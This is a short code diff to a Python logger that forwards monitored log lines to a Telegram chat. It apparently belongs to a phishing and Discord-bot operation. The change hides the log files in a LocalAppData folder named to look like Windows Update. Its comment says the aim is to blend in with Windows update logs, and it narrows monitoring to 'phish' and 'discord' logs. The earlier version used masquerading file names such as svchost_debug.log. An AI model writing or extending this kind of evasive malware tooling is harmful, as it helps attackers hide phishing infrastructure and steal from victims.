@@ -32,13 +32,16 @@ def monitor_file(path, label):
             log_to_tg(f"📝 <b>[{label}]</b> <code>{txt}</code>")
 
 def main():
-    # Monitors multiple project log files and forwards them to Telegram
+    # Use a portable path under LocalAppData, blending in with Windows update logs
+    update_dir = os.path.join(os.getenv('LOCALAPPDATA', tempfile.gettempdir()), 'Microsoft', 'Windows', 'Update')
+    os.makedirs(update_dir, exist_ok=True)
+
+    # Monitors only phishing and discord bot logs to avoid feedback loop with C# bot
     logs = [
-        ("C:\\Users\\Public\\svchost_debug.log", "CORE"),
-        ("C:\\Users\\Public\\edge_update_debug.log", "HANDLER"),
-        ("C:\\Users\\Public\\phish_debug.log", "PHISH"),
-        ("C:\\Users\\Public\\discord_debug.log", "DISCORD")
+        (os.path.join(update_dir, "phish_log.dat"), "PHISH"),
+        (os.path.join(update_dir, "discord_log.dat"), "DISCORD")
     ]
+
     
     log_to_tg("🚀 <b>Global Logger Started</b>. Monitoring project events...")
     
